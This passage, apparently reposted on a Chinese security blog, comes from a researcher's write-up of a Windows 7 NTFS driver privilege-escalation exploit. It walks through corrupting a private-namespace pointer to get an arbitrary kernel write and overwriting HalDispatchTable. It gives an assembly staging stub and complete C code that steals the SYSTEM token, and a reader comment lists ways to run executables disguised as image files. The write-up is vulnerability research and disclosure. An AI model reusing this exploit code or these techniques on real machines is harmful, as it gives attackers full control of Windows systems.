+	<em>A process can create a private namespace using the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682419%28v=vs.85%29.aspx">CreatePrivateNamespace</a> function. This function requires that you specify a boundary that defines how the objects in the namespace are to be isolated. The caller must be within the specified boundary for the create operation to succeed. To specify a boundary, use the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682121%28v=vs.85%29.aspx">CreateBoundaryDescriptor</a> and <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681937%28v=vs.85%29.aspx">AddSIDToBoundaryDescriptor</a> functions.</em> 
+</p>
+<p style="text-indent:2em;">
+	The abstract details of the object semantics beyond our interest – the really important part is its representation as a structure in the kernel memory. After creating an exemplary private namespace and investigating the handle, the namespace proves to be technically implemented as a Directory object.
+</p>
+<pre class="prettyprint">kd&gt; !handle 28
+PROCESS fffffa80054e4060
+  SessionId: 1  Cid: 0584    Peb: 7fffffdb000  ParentCid: 0240
+  DirBase: 58fac000  ObjectTable: fffff8a005bd8ed0  HandleCount:  11.
+  Image: ntfs_exploit.exe
+
+Handle table at fffff8a00a367000 with 11 entries in use
+0028: Object: fffff8a007d068d0  GrantedAccess: 000f000f Entry: fffff8a00a3670a0
+Object: fffff8a007d068d0  Type: (fffffa8003666f30) Directory
+  ObjectHeader: fffff8a007d068a0 (new version)
+      HandleCount: 1  PointerCount: 2</pre>
+<p style="text-indent:2em;">
+	While typical Windows Directory objects are represented by a fixed-size OBJECT_DIRECTORY structure, private namespaces are no ordinary directories – in fact, they consist of three separate structures bundled within a single allocation: an almost empty OBJECT_DIRECTORY followed by structures referred to as NAMESPACE_DESCRIPTOR and BOUNDARY_DESCRIPTOR, the last one being of variable size dependent on the length of the boundary name specified through <em>CreateBoundaryDescriptor</em>. The overall layout of a private namespace in the kernel memory is broken down below (second structure is highlighted):
+</p>
+<pre class="prettyprint">fffff8a0`07d068d0  00000000 00000000 00000000 00000000
+fffff8a0`07d068e0  00000000 00000000 00000000 00000000
+fffff8a0`07d068f0  00000000 00000000 00000000 00000000
+fffff8a0`07d06900  00000000 00000000 00000000 00000000
+fffff8a0`07d06910  00000000 00000000 00000000 00000000
+fffff8a0`07d06920  00000000 00000000 00000000 00000000
+fffff8a0`07d06930  00000000 00000000 00000000 00000000
+fffff8a0`07d06940  00000000 00000000 00000000 00000000
+fffff8a0`07d06950  00000000 00000000 00000000 00000000
+fffff8a0`07d06960  00000000 00000000 00000000 00000000
+fffff8a0`07d06970  00000000 00000000 00000000 00000000
+fffff8a0`07d06980  00000000 00000000 00000000 00000000
+fffff8a0`07d06990  00000000 00000000 00000000 00000000
+fffff8a0`07d069a0  00000000 00000000 00000000 00000000
+fffff8a0`07d069b0  00000000 00000000 00000000 00000000
+fffff8a0`07d069c0  00000000 00000000 00000000 00000000
+fffff8a0`07d069d0  00000000 00000000 00000000 00000000
+fffff8a0`07d069e0  00000000 00000000 00000000 00000000
+fffff8a0`07d069f0  00000000 00000000 00000000 00000000
+fffff8a0`07d06a00  00000000 00000000 ffffffff 00000000
+fffff8a0`07d06a10  07d06a20 fffff8a0 00000001 00000000
+fffff8a0`07d06a20  0283c550 fffff800 0283c550 fffff800
+fffff8a0`07d06a30  07d068d0 fffff8a0 00000028 00000000
+fffff8a0`07d06a40  00000000 00000000 00000021 00000000
+fffff8a0`07d06a50  00000001 00000001 00000028 00000000
+fffff8a0`07d06a60  00000001 00000016 00350031 00320034
+fffff8a0`07d06a70  00340038 00000033</pre>
+<p style="text-indent:2em;">
+	For any given directory, its namespace descriptor can be stored at any address, hence the presence of a <em>PrivateNamespace</em> pointer field in the structure:
+</p>
+<pre class="prettyprint">kd&gt; dt _OBJECT_DIRECTORY
+nt!_OBJECT_DIRECTORY
+ +0x000 HashBuckets      : [37] Ptr64 _OBJECT_DIRECTORY_ENTRY
+ +0x128 Lock             : _EX_PUSH_LOCK
+ +0x130 DeviceMap        : Ptr64 _DEVICE_MAP
+ +0x138 SessionId        : Uint4B
+ +0x140 NamespaceEntry   : Ptr64 Void
+ +0x148 Flags            : Uint4B</pre>
+<p style="text-indent:2em;">
+	In all practical scenarios, the pointer contains an address 0×10 bytes ahead of its own one (as shown in the object layout breakdown above). If an attacker was able to modify the pointer, the kernel would consequently use an improper address to access the structure. Furthermore, the NAMESPACE_DESCRIPTOR being pointed at contains a LIST_ENTRY field which links the structure into a global linked list of all private namespaces in the system. Objects are first attached to the list during their creation in <em>nt!NtCreatePrivateNamespace</em>, and later removed from the list during object deletion in <em>nt!ObpRemoveNamespaceFromTable</em>. Since the Windows 7 kernel doesn’t implement safe unlinking of LIST_ENTRY structures (Windows 8 does), the code responsible for unlinking is represented by a commonly observed assembly pattern, exposing the kernel to a potential write-what-where condition if both Flink/Blink fields are controlled by an attacker:
+</p>
+<pre class="prettyprint">PAGE:00000001402EC29D                 mov     rax, [rbx+140h]
+[...]
+PAGE:00000001402EC2BD                 mov     rcx, [rax]
+[...]
+PAGE:00000001402EC2C4                 mov     rax, [rax+8]
+PAGE:00000001402EC2C8                 mov     [rax], rcx
+PAGE:00000001402EC2CB                 mov     [rcx+8], rax</pre>
+<p style="text-indent:2em;">
+	Last but not least, a majority of the OBJECT_DIRECTORY structure used for namespaces is zeroed out and completely ignored throughout the object’s lifespan, which mitigates the risk of corrupting important kernel data. Practical experiments have shown that it is possible to safely overwrite OBJECT_DIRECTORY.PrivateNamespace with a fixed 00000004`fffffa80 value by using a 0x10c offset relative to the object’s base address (which is already known to the exploit thanks to <em>NtQuerySystemInformation</em> and <em>SystemHandleInformation</em>). Let’s take a look at which parts of the structure are tampered with and why it is a good solution system reliability-wise.
+</p>
+<pre class="prettyprint">fffff8a0`07d069f0  00000000 00800001 00000000 00000000
+fffff8a0`07d06a00  00000000 00000000 ffffffff 04424640
+fffff8a0`07d06a10  fffffa80 00000004 00000001 00000001</pre>
+<p style="text-indent:2em;">
+	Let’s quickly iterate through the memory operations performed over the memory region:
+</p>
+<ul>
+	<li>
+		<p style="text-indent:2em;">
+			<strong>[dword](x + 0×40)</strong> or <strong>fffff8a0`07d06a1c</strong> is always zero during the comparison, as it is the unused padding memory past the OBJECT_DIRECTORY structure.
+		</p>
+	</li>
+	<li>
+		<p style="text-indent:2em;">
+			<strong>[dword](x + 0×38)</strong> or <strong>fffff8a0`07d06a14</strong> is the upper part of the <em>PrivateNamespace</em> pointer, overwritten with a value of 4.
+		</p>
+	</li>
+	<li>
+		<p style="text-indent:2em;">
+			<strong>[word](x + 0×18)</strong> or <strong>fffff8a0`07d069f4</strong> points into an unused field within OBJECT_DIRECTORY.
+		</p>
+	</li>
+	<li>
+		<p style="text-indent:2em;">
+			<strong>[qword](x + 0×30)</strong> or <strong>fffff8a0`07d06a0c</strong> spans across two fields: its lower 32 bits overlap with <em>SessionId</em> (not dangerous), while the upper part is mapped to the lower DWORD of the <em>PrivateNamespace</em> pointer. Thanks to the predictability of the most significant bits of kernel-mode addresses, we achieve a full overwrite of <em>PrivateNamespace</em> with a user-mode 00000004`fffffa80 address, which can be trivially mapped through <em>VirtualAlloc</em> or any other such API.
+		</p>
+	</li>
+	<li>
+		<p style="text-indent:2em;">
+			<strong>[word](x + 0x1a)</strong> or <strong>fffff8a0`07d069f2</strong> points into an unused field within OBJECT_DIRECTORY.
+		</p>
+	</li>
+</ul>
+<p style="text-indent:2em;">
+	After redirecting the <em>PrivateNamespace</em> pointer and mapping memory at the magic ring-3 address, an attacker is able to trigger a fully-controlled write-what-where by manipulating the values at 00000004`fffffa80 and 00000004`fffffa84, and fnally calling CloseHandle on the namespace object thus invoking the desired code path in <em>nt!ObpRemoveNamespaceFromTable</em>.
+</p>
+<pre class="prettyprint">kd&gt; u
+nt!ObpRemoveNamespaceFromTable+0x58:
+fffff800`029362b8 488908          mov     qword ptr [rax],rcx
+fffff800`029362bb 48894108        mov     qword ptr [rcx+8],rax
+fffff800`029362bf ff0dd3d2f3ff    dec     dword ptr [nt!ObpPrivateNamespaceLookupTable+0x258 (fffff800`02873598)]
+fffff800`029362c5 0f0d0dc4d2f3ff  prefetchw [nt!ObpPrivateNamespaceLookupTable+0x250 (fffff800`02873590)]
+fffff800`029362cc 488b05bdd2f3ff  mov     rax,qword ptr [nt!ObpPrivateNamespaceLookupTable+0x250 (fffff800`02873590)]
+fffff800`029362d3 488bc8          mov     rcx,rax
+fffff800`029362d6 4883e1f0        and     rcx,0FFFFFFFFFFFFFFF0h
+fffff800`029362da 4883f910        cmp     rcx,10h
+kd&gt; ? rax
+Evaluate expression: 4702111234474983745 = 41414141`41414141
+kd&gt; ? rcx
+Evaluate expression: 4774451407313060418 = 42424242`42424242</pre>
+<p style="text-indent:2em;">
+	At this point, we are free to overwrite any kernel memory region with arbitrary data, making it trivial to achieve an actual elevation of privileges. The next section details the remaining steps required to reliably change the primary access token of the current process to NT AUTHORITY\SYSTEM and exit the exploit without crashing the system.
+</p>
+<h4>
+	Exploitation phase #3: owning the system
+</h4>
+<p style="text-indent:2em;">
+	With the ability to replace arbitrary kernel memory with arbitrary data, one has lots of options to choose from in order to hijack ring-0 code execution flow. The most typical ideas include overwriting the <em>nt!HalDispatchTable+sizeof(void*)</em> function pointer, the <em>nt!MmUserProbeAddress</em> value, a return address on a kernel-mode stack or <a href="http://www.hackinthebox.org/misc/HITB-Ezine-Issue-002.pdf">one of the function pointers within various Windows objects</a> (such as ETHREAD.SuspendApc.KernelRoutine). In this particular proof of concept exploit, I decided to go with <em>HalDispatchTable</em>, being the easiest and most commonly used technique. Because the write-what-where triggered during namespace deletion works both ways, we require the following staging payload in order to jump over the old value of <em>HalDispatchTable+8</em> at offset 8 in our code (the magic 0×4141… value must be replaced with the address of the actual shellcode).
+</p>
+<pre class="prettyprint">[bits 64]
+
+start:
+  jmp @@
+
+padding:
+  times (8 + 8 - (padding - start)) db 0
+
+@@:
+  mov rax, 0x4141414141414141
+  jmp rax</pre>
+<p style="text-indent:2em;">
+	Thanks to the fact that the overwritten pointer is saved at offset 8 of the staging payload by the kernel, we can safely restore its original value after replacing the process security token in our hostile ring-0 routine. That way, we make sure that post-exploitation system state is completely clean and subsequent <em>NtQueryIntervalProfile</em> calls from other processes won’t bring the system down after we achieve our goals.
+</p>
+<h3>
+	The payload
+</h3>
+<p style="text-indent:2em;">
+	I have often seen Windows kernel exploits using very non-elegant payloads written in assembly, which would use constant offsets and other types of hard-coded information. Such payloads are not portable across various Windows editions or processor bitnesses and most of all, they just look bad. I decided to develop my own high-level C payload for replacing primary process tokens using documented Windows kernel API. Since all of the referenced functions are publicly exported kernel symbols, their addresses can be obtained while still in user-mode, as a part of the pre-exploitation initialization via <em>NtQuerySystemInformation</em> and <em>SystemModuleInformation</em>. Without further ado, the code looks like the following:
+</p>
+<pre class="prettyprint lang-cpp">NTSTATUS EscalatePrivileges( /* adequate number of parameters */ ) {
+  OBJECT_ATTRIBUTES ObjectAttributes;
+  NTSTATUS NtStatus;
+  HANDLE hSystem = NULL, hToken = NULL, hNewToken = NULL;
+  CLIENT_ID ClientId = {(HANDLE)4, NULL};
+  PROCESS_ACCESS_TOKEN AccessToken;
+
+  InitializeObjectAttributes(&amp;ObjectAttributes, NULL, 0, NULL, NULL);
+  NtStatus = pZwOpenProcess(&amp;hSystem, GENERIC_ALL, &amp;ObjectAttributes, &amp;ClientId);
+  if (!NT_SUCCESS(NtStatus)) {
+    goto err;
+  }
+
+  NtStatus = pZwOpenProcessToken(hSystem, GENERIC_ALL, &amp;hToken);
+  if (!NT_SUCCESS(NtStatus)) {
+    return STATUS_UNSUCCESSFUL;
+  }
+
+  InitializeObjectAttributes(&amp;ObjectAttributes, NULL, 0, NULL, NULL);
+  NtStatus = pZwDuplicateToken(hToken, TOKEN_ALL_ACCESS, &amp;ObjectAttributes, TRUE,
+                               TokenPrimary, &amp;hNewToken);
+  if (!NT_SUCCESS(NtStatus)) {
+    goto err;
+  }
+
+  AccessToken.Token = hNewToken;
+  AccessToken.Thread = NULL;
+  NtStatus = pZwSetInformationProcess(GetCurrentProcess(),
+                                      ProcessAccessToken,
+                                      &amp;AccessToken,
+                                      sizeof(PROCESS_ACCESS_TOKEN));
+
+err:
+  if (hNewToken != NULL) {
+    pZwCloseHandle(hNewToken);
+  }
+  if (hToken != NULL) {
+    pZwCloseHandle(hToken);
+  }
+  if (hSystem != NULL) {
+    pZwCloseHandle(hSystem);
+  }
+
+  return NtStatus;
+}</pre>
+<p style="text-indent:2em;">
+	In short, the routine attempts to open a handle to the “System” process by using the default PID=4, acquires a handle to its access token which is guaranteed to have the highest possible privileges (NT AUTHORITY\SYSTEM user token), duplicates it as a primary token and assigns it to the current program – a rather typical privilege escalation payload activity implemented using four official API functions. It works properly on all 32-bit platforms including the latest Windows 8; for example, it has been used in the final stage of the <a href="http://j00ru.vexillium.org/blog/20_05_12/cve_2011_2018.pdf">CVE-2011-2018 vulnerability exploitation</a>.
+</p>
+<p style="text-indent:2em;">
+	Interestingly, when testing the shellcode on Windows 7 64-bit, <em>ZwSetInformationProcess</em> unexpectedly returned error code 0xC00000BB (STATUS_NOT_SUPPORTED). After a cursory investigation, it turned out that the internal <em>nt!PspAssignPrimaryToken</em> routine verifies the <em>PrimaryTokenFrozen</em> flag potentially set in the EPROCESS.Flags2 field of the process to receive a new primary token:
+</p>
+<pre class="prettyprint">+0x434 Flags2           : Uint4B
+ +0x434 JobNotReallyActive : Pos 0, 1 Bit
+ +0x434 AccountingFolded : Pos 1, 1 Bit
+ +0x434 NewProcessReported : Pos 2, 1 Bit
+ +0x434 ExitProcessReported : Pos 3, 1 Bit
+ +0x434 ReportCommitChanges : Pos 4, 1 Bit
+ +0x434 LastReportMemory : Pos 5, 1 Bit
+ +0x434 ReportPhysicalPageChanges : Pos 6, 1 Bit
+ +0x434 HandleTableRundown : Pos 7, 1 Bit
+ +0x434 NeedsHandleRundown : Pos 8, 1 Bit
+ +0x434 RefTraceEnabled  : Pos 9, 1 Bit
+ +0x434 NumaAware        : Pos 10, 1 Bit
+ +0x434 ProtectedProcess : Pos 11, 1 Bit
+ +0x434 DefaultPagePriority : Pos 12, 3 Bits
+ +0x434 PrimaryTokenFrozen : Pos 15, 1 Bit
+ +0x434 ProcessVerifierTarget : Pos 16, 1 Bit
+ +0x434 StackRandomizationDisabled : Pos 17, 1 Bit
+ +0x434 AffinityPermanent : Pos 18, 1 Bit
+ +0x434 AffinityUpdateEnable : Pos 19, 1 Bit
+ +0x434 PropagateNode    : Pos 20, 1 Bit
+ +0x434 ExplicitAffinity : Pos 21, 1 Bit</pre>
+<p style="text-indent:2em;">
+	At that time, I was not able to find any documented way of clearing the flag for the current process or setting a new token regardless of the flag – <span style="color:#000000;"><del>if you are aware of any such technique, I am more than happy to hear</del></span><del> fro</del><del>m</del><del> y</del><del>ou</del> I later learned that the flag is not set for processes created with CREATE_SUSPENDED that haven’t been resumed yet (<a href="https://twitter.com/aionescu/status/260169232237592576">thanks Alex!</a>). In the meanwhile, I decided to zero out the flag manually by hardcoding the offset into the current process structure for the sake of a working proof of concept:
+</p>
+<pre class="prettyprint lang-cpp">PDWORD CurrentProcess = PsGetCurrentProcess();
+
+[...]
+
+// Disable the EPROCESS-&gt;Flags2 PrimaryTokenFrozen flag.
+CurrentProcess[kFlags2Offset] &amp;= ~kPrimaryTokenFrozen;</pre>
+<p style="text-indent:2em;">
+	After this slight modification the payload successfully completes, elevating the attacker’s rights in the system from whatever user he was running as to NT AUTHORITY\SYSTEM.
+</p>
+<h3>
+	Resource releasing issues
+</h3>
+<p style="text-indent:2em;">
+	During the process of locking a volume, the supposedly present (but in fact non-existent) ERESOURCE structure is used twice – once to acquire the synchronization lock and once to release it. However, the problem with our modified volume is handled differently by the <em>ntfs!NtfsAcquirePagingResourceExclusive</em> and <em>ntfs!NtfsReleasePagingResource</em>. While the former routine uses a NULL pointer to retrieve the PERESOURCE pointer, the latter one simply passes a NULL parameter to a recursive call to <em>nt!ExReleaseResourceLite</em>.
+</p>
+<p style="text-indent:2em;">
+	The primary means of sanitisation the kernel release function takes is verifying that the resource in consideration is actually owned by the calling thread, and does that by comparing the value at structure offset 0×30 with the return value of <em>nt!PsGetCurrentThread</em>. What it practically means for us is that we have to obtain the ETHREAD address of the current thread by e.g. duplicating current thread’s handle and seeking through the <em>SystemHandleInformation</em> results, and eventually insert the value at virtual address 0×30. This prevents the system from falling upon the following bugcheck and ensures successful completion of the exploit:
+</p>
+<pre class="prettyprint">RESOURCE_NOT_OWNED (e3)
+A thread tried to release a resource it did not own.
+Arguments:
+Arg1: 0000000000000000, Address of resource
+Arg2: fffffa8003814b50, Address of thread
+Arg3: 0000000000000000, Address of owner table if there is one
+Arg4: 0000000000000002</pre>
+<p style="text-indent:2em;">
+	Besides the above, we didn’t encounter any more problems during the proof of concept development; after resolving the discussed issues, the exploit has worked smoothly on several Windows 7 platforms we had a chance to test. An actual demo showing how the vulnerability is taken advantage of on a real laptop by physically injecting the malformed volume is presented below.
+</p>
+<h4>
+	Demo
+</h4>
+<p style="text-indent:2em;">
+	（提示：YouTube 视频，需翻墙。）
+</p>
+<p style="text-indent:2em;">
+	<iframe height="360" src="http://www.youtube.com/embed/b0g0zSlaI9k?rel=0" frameborder="0" width="640">
+	</iframe>
+</p>
+<h4>
+	Conclusions
+</h4>
+<p style="text-indent:2em;">
+	Built-in file system device drivers have bugs and it’s fun looking for them (regardless of the often low severity they have). Windows actively uses so many interesting system structures (in)directly controlled from user-mode that there is always one that fits properly, even for very complicated types of memory corruption conditions. These are the two major conclusions we had after playing with this particular bug. We hope that you enjoyed the post, and stay tuned for lots of other interesting material soon :)
+</p>
+<p style="text-indent:2em;">
+	From: <a href="http://j00ru.vexillium.org/?p=1272" target="_blank">http://j00ru.vexillium.org/?p=1272</a> 
+</p>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="2674,3084,175.160.206.57">
+<p>佚名 @ 2012-11-14 23:25:26</p>
+<p style="text-indent:2em">核大，这个东西，有没有傻瓜式的利用程序？看起来很厉害的样子。（插入U盘立即中招？）</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">没有</p>
+</blockquote>
+<blockquote id="2675,3084,175.160.206.57">
+<p>佚名 @ 2012-11-15 00:35:51</p>
+<p style="text-indent:2em">靠，我成投稿的了。好吧，再打听一个 http://forum.cnsec.org/forum-45-1.html 这个东西，究竟有没有？是真有这种神器，还是发帖人吹牛呢？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">你地址写错了吧，这是暗组水区……</p>
+</blockquote>
+<blockquote id="2676,3084,175.160.195.37">
+<p>佚名 @ 2012-11-15 00:54:06</p>
+<p style="text-indent:2em">对不起，是这个：http://forum.cnsec.org/thread-85087-1-1.html</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">看到这个帖子，我真的笑了，无语了，剧情如下……
+一个菜鸟，偶然间学会了直接拔电源快速关机大法，于是在网上发帖：其实有个不按关机键快速关机的大法……
+然后引来一群菜鸟回帖，该发帖的菜鸟还煞有其事的把该方法当做秘密，藏着捂着怕别人知道，时不时还故意露点出来……
+剧情就是这样，哈哈哈哈……
+其实这是电脑基础常识，想要达到这种效果，有如下几种方法：
+1、修改注册表中文件关联，例如：将 jpg 后缀执行方式改成和 exe 一样，然后所有的 jpg 一打开，都会当做程序执行……
+2、将某 exe 改名为 a.jpg，然后在 cmd 下输入：a.jpg 或者 start a.jpg 或者 call a.jpg 都可以运行，原理很简单，因为在 cmd 下只认文件头，不是 PE 程序，才看后缀……
+3、使用 Unicode 控制字符，具体不解释了……
+4、利用第三方软件，例如：winrar 等……
+另外，这种方法不会达到任何所谓的免杀效果（和免杀无关），纯属作者装逼意淫……</p>
+</blockquote>
+<blockquote id="2677,3084,121.29.34.54">
+<p>溪 @ 2012-11-15 07:24:19</p>
+<p style="text-indent:2em">- -最近神经了看到病毒 xss 等等就往流量方面想。不过最近确实得到许多引流量的想法</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="2680,3084,58.254.92.247">
+<p>佚名 @ 2012-11-15 22:12:25</p>
+<p style="text-indent:2em">虽然看不懂文章在说什么，但是好像很厉害的样子。NTFS文件系统可以被恶意利用的地方本来就不少。这种基于windows系统本身的文件系统，在绕过了文件保护系统之后就等于一个穿着轻纱的+躺在+面前一样，还好我是那个壮汉。。虽然不知道我在说什么，但是好像也很厉害的样子。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">一个穿着轻纱躺在面前的壮汉……　-_-#</p>
+</blockquote>
+<blockquote id="2705,3084,112.241.181.47">
+<p>dashige @ 2012-11-19 05:29:49</p>
+<p style="text-indent:2em">核老大收啥站啊，你可要把握好自己啊...</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">一些小站……</p>
+</blockquote>
+<blockquote id="2708,3084,121.29.120.166">
+<p>佚名 @ 2012-11-19 16:15:16</p>
+<p style="text-indent:2em">经常蓝屏 因为装的一块tplink的无线网卡，不知道是不是ntfs.sys引起的。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">ntfs.sys 是文件系统驱动，和无线网卡没有直接关系，应该和它无关。</p>
+</blockquote>
+</div>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">j00ru</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2012-11-15
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/windows/">Windows</a>
+          <a href="https://lcx.cc/tags/%E5%85%A5%E4%BE%B5/">入侵</a>
+          <a href="https://lcx.cc/tags/api/">API</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/bug/">bug</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/exp/">EXP</a>
+          <a href="https://lcx.cc/tags/exploit/">Exploit</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/nds/">NDS</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/rat/">Rat</a>
+          <a href="https://lcx.cc/tags/shell/">Shell</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3085/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">谷歌发布“现实虚拟化”游戏Ingress</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3083/">
+            <span class="next-text nav-default">Touche：范围触摸技术，可分别触、捏、握，迪斯尼神奇的触摸技术</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 